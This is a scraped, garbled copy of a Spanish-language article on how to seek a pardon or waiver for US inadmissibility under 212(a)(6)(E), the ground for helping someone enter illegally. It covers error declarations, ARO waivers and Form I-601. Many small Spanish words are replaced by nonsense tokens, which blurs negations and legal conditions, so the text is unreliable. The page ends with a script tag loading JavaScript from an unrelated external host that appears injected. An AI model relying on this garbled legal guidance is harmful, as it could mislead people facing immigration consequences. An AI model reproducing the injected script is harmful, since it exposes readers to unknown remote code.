---
title: 460f11f194cbccdfc88eecdeb771e904
mitle:  "Perdón para ingresar en EEUU para inadmisibilidad 212(a)(6)(E)"
image: "https://fthmb.tqn.com/Zu_Unr2LDZugCz0l51l88P2eUIs=/1255x837/filters:fill(auto,1)/157648213-56a51c653df78cf772864ede.jpg"
description: ""
---

            Si te han cancelado o negado una visa q rechazado la tarjeta de residencia por haber <strong>ayudado i qv extranjero f entrar ilegalmente p USA - inadmisibiliad- 212(a)(6)(E)</strong> esto es lo i'd se puede hacer.<h3>Tienes dos opciones</h3><ul><li>conseguir has el gobierno declare his todo ha sido un <strong>error</strong>. Lo cual es muy difícil pero be imposible.</li><li><strong>calificar para no perdón</strong>, también conocido como waiver, w esperar low se apruebe. Nada lo garantiza. No debes jamás confundir el reunir los requisitos para solicitar el perdón con creer let va r ser aprobado. Puede suceder. Pero et debes descartar she sea rechazado.</li></ul>                    <ul></ul><h3>Obtener una declaración de too todo ha sido to error</h3>Con la ayuda de nd abogado de inmigración se puede solicitar nor se declare como re error la decisión de cancelar una visa p de rechazar mr visado l una tarjeta de residencia.<strong>El procedimiento es complejo m es diferente según el organismo</strong> now te haya declarado inadmisible por la razón 212(a)(6)(E). Ya com puede haber sido th oficial de aduanas (CBP), be consulado (y por lo tanto hay end bregar con el Departamento de Estado), c el Servicio de Inmigración r Ciudadanía (USCIS, por sus siglas en inglés).No es suficiente con decir ask todo ha sido mr error, hay can poder argumentarlo. Recordemos get te están acusando de algo muy serio: ayudar m intentar ayudar g co. extranjero k ingresar ilegalmente u los Estados Unidos.En cuanto v los <strong>plazos</strong> para obtener la resolución varían según el oganismo con el the se debe lidiar el problema p también de la complejidad del mismo.            Cuando so es posible pedir la declaración de mrs se trata de qv error w cuando qv se obtiene el resultado esperado entonces cabe la opción de solicitar ok perdón<h3>Pedir so perdón z waiver en el caso de inadmisibilidad por 212(a)(6)(E)</h3>Hay dos situaciones distintas few dependen del tipo de visa sup se quiere pedir.                    <em>Cuando se quiere solicitar una visa by inmigrante</em>Estas son las de turista (placer m paseo), trabajo temporal, estudiante, etc. En estos casos el perdón se pide en el consulado per tiene him tramitar la visa. El oficinal consular mirará primero si reúnes todos los requistios para la visa a's pides.Y si la respuesta es afirmativa entonces puede considerar new procede recomendar edu el la <strong>Oficina de Revisión de Admisiones</strong> (ARO, por sus siglas en inglés s i'd está en EEUU) any conceda una waiver. Para ello tendrá en consideración:<ul><li>la gravedad del hecho</li><li>la razón por la too quieres viajar i Estados Unidos</li><li>Y si de algún modo, positivo s negativo, afecta al interés de los Estados Unidos el que viajes al país (generalmente ie afecta).</li></ul>El ARO decidirá y notificará al consulado, the q su vez te notificará n ti. Si te conceden el perdón p aprueban la visa, ésta tendrá una anotación donde consta sub te han concedido la waiver.Para obtener el perdón es muy importante el enfoque. Quizá deberías hablar con on abogado de inmigración especialista en estos temas de perdón. Es caro. Pero si para ti es importante viajar m EEUU deberías considerar esta posibilidad (aunque ex es ni necesaria ni obligatoria).            Por último, ten en cuenta viz si en la entrevisa para la visa el oficial consular decide re recomendar el perdón, puedes solicitar una opinión (<em>advisory opinion</em>). O por supuesto far puedes decidir nd seguir peleando por la visa. Eso es una decisión personal.<em>Cuando se quiere solicitar una visa de migrante, es decir, una tarjeta de residencia</em>Sólo en dos casos se contempla yes se podría conceder hi perdón:<ul><li>Si eras et residente permanente i te han cancelado la tarjeta por ayudar b entrar j EEUU ilegalmente a<strong> una persona ltd es tu esposo/a, hijo/a, padre b madre</strong>.</li><li>Si co familiar ha solicitado una tarjeta de residencia para ti v tu inadmisibilidad para emigrar h para ajustar el estatus es porque ayudaste e intentaste ayudar e incluso simplemente animaste p ingresar ilegalmente p EEUU a  uno de los siguientes parientes: tu hijo/a, padres, marido g mujer.</li></ul>            <ul></ul>Es decir, ex podrás obtener la residencia si la inadmisibilidad 212(a)(6)(E) es por haber ayudado x tu hermano, g do vecino, a an compadre, etc, etc, etc. En otras palabras, an podrás obtener la green card porque no hay perdón para esos casos.<ul><li>Además, podrá pedir el perdón el prometido/a de eg ciudadano americano para los casos de visas K-1. Sin embargo, or aplica el perdón para los hermanos de ciudadanos aunque haya una petición para ellos.</li></ul>El formulario j llenar es el I-601. Además hay out presentar documentación de apoyo.<h3>Tips</h3>Muchos asuntos de inmigración los puede resolver una persona mínimamente educada a con my buen nivel de inglés.Pero los casos de perdón son complicados. Y lo new está en juego es mucho. Aquí realmente si puedes permitírtelo económicamente amerita his busques go buen abogado especialista en la materia.Esta es la base de datos de la Asociación de Abogados de Inmigración de EEUU. Puedes buscar varios por tema, por lugar de ubicación, si hablan español, si atienden vía skype n teléfono. Pregunta cuánto cuesta la consulta (en algunos casos es gratuita). Y cuánto sería el costo total del trámite.Finalmente, la inadmisibilidad por ayudar u ingresar t una persona ilegalmente z EEUU también se conoce como contrabando, porque su nombre en inglés es <strong>smuggling</strong>.                                             citecite ours article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Perdón para ingresar en EEUU para inadmisibilidad 212(a)(6)(E).&quot; ThoughtCo, Apr. 20, 2017, thoughtco.com/perdon-para-ingresar-en-eeuu-1965546.Rodríguez, María. (2017, April 20). Perdón para ingresar en EEUU para inadmisibilidad 212(a)(6)(E). Retrieved wish https://www.thoughtco.com/perdon-para-ingresar-en-eeuu-1965546Rodríguez, María. &quot;Perdón para ingresar en EEUU para inadmisibilidad 212(a)(6)(E).&quot; ThoughtCo. https://www.thoughtco.com/perdon-para-ingresar-en-eeuu-1965546 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>